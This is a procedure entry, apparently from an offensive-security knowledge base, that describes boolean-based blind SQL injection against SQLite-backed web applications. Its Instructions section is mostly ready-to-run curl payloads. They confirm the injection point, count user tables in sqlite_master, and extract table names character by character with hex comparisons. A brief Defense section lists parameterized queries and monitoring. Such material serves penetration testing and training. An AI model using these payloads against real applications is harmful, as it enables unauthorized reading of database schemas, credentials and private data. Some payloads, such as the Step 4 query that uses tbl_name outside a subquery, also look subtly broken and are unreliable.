---
id: 269bf358-bccc-4868-8f1a-d19a775c99bc
name: SQLite-Boolean-Based-Information-Extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.075423+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - boolean-extraction
  - sqlite-injection
  - sql-injection
  - blind-sqli
commands:
  - '[[commands/curl-boolean-sqli-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# SQLite-Boolean-Based-Information-Extraction

## Summary

This procedure demonstrates a boolean-based blind SQL injection technique to extract sensitive information from a SQLite database embedded in a web application. By crafting SQL payloads that force the application to return true or false responses based on database conditions, attackers can infer data such as table names, structures, and contents character by character without direct query output.

## Description

SQLite databases are commonly used in mobile apps, embedded systems, and lightweight web applications due to their serverless architecture. However, if user inputs are not properly sanitized, attackers can inject malicious SQL payloads to manipulate queries. Boolean-based blind SQL injection exploits this by appending conditions that alter the application's response (e.g., page loads differently for true vs. false). This technique is particularly useful when error messages or direct data dumps are suppressed, allowing extraction of information like database schema, user credentials, or sensitive data through iterative guessing. The attack targets the sqlite_master table to enumerate user-created tables and their properties. From an offensive standpoint, this enables reconnaissance for further exploitation, such as data exfiltration or privilege escalation. The procedure assumes a reflected or time-based variant where response differences indicate boolean outcomes.

## Requirements

1. Valid injection point in the target web application (e.g., a search parameter vulnerable to SQLi).
2. Network access to the application and ability to observe response differences (e.g., via browser or proxy).
3. Basic knowledge of SQL syntax and hexadecimal encoding for character comparison.
4. Tools like a web proxy (e.g., Burp Suite) for intercepting and modifying requests.

## Defense

- Implement prepared statements or parameterized queries to separate SQL code from user input.
- Use web application firewalls (WAFs) to detect and block anomalous SQL patterns.
- Sanitize and validate all user inputs, escaping special characters.
- Limit database privileges to the minimum necessary and avoid exposing sqlite_master unnecessarily.
- Enable application-level logging for SQL queries and monitor for injection attempts.

## Objectives

1. Confirm the presence of a blind boolean-based SQL injection vulnerability.
2. Extract database schema information, such as table names, starting with the first character of the first user table.
3. Infer sensitive data through conditional responses without direct output.

## Instructions

### Step 1: Confirm Boolean-Based Blind SQL Injection Vulnerability

**Context**: Test the injection point to ensure it supports boolean conditions by appending a always-true and always-false payload. Observe if the application's response changes (e.g., page content differs for true vs. false).

**Command** ([[commands/curl-boolean-sqli-payload]]):
```bash
curl -X GET "http://target.com/search?q=1' AND 1=1--" -v
curl -X GET "http://target.com/search?q=1' AND 1=2--" -v
```

> The first command should return a normal page (true condition), while the second returns an error or empty result (false). This verifies the injection point is exploitable for boolean logic. If responses differ, proceed; otherwise, the point may not be vulnerable.

### Step 2: Determine the Number of Tables or Schema Length

**Context**: Before extracting names, estimate the schema size (e.g., number of tables) using boolean conditions on COUNT or LENGTH functions. This helps bound the extraction process.

**Command** ([[commands/curl-boolean-sqli-payload]]):
```bash
curl -X GET "http://target.com/search?q=1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%') > 0--" -v
```

> Success is indicated by a true response (normal page load), confirming at least one user table exists. Iterate the number (e.g., >1, >2) to find the exact count. This step narrows the OFFSET in subsequent queries.

### Step 3: Extract First Character of Table Name Using Boolean Comparison

**Context**: Use a conditional query on sqlite_master to check if the first character of the first user table name matches or exceeds a guessed character in hex. Iterate through possible characters (A-Z, a-z, 0-9) by sending payloads and observing boolean responses to build the name character by character.

**Code** ([[codes/SQLite-Boolean-Check-Table-Name-Starts-With-Char]]):

**Command** ([[commands/curl-boolean-sqli-payload]]):
```bash
curl -X GET "http://target.com/search?q=1' $_INJECTION_POINT and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('$_GUESS_CHAR')--" -v
```

> Replace $_GUESS_CHAR with characters like 'a', 'b', etc. A true response (normal page) means the first character is greater than the guess; false means equal or less. Use binary search on ASCII values (e.g., start with 'm' for midpoint) to efficiently guess. Expected output: Differential responses allowing inference of the hex value of the first character (e.g., true for > 'a' confirms it starts after 'a'). Repeat for subsequent positions by changing substr(tbl_name,2,1), etc.

### Step 4: Verify and Expand Extraction

**Context**: Once the first character is known, chain conditions to extract subsequent characters or full names. Validate by reconstructing the table name and testing for existence.

**Command** ([[commands/curl-boolean-sqli-payload]]):
```bash
curl -X GET "http://target.com/search?q=1' AND substr(tbl_name,1,1)='$_EXTRACTED_CHAR' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' and tbl_name LIKE '$_EXTRACTED_CHAR%') > 0--" -v
```

> This confirms the extracted character and allows extension to full name extraction. Success: True response validates the guess; use this to pivot to extracting column names or data from the identified table.
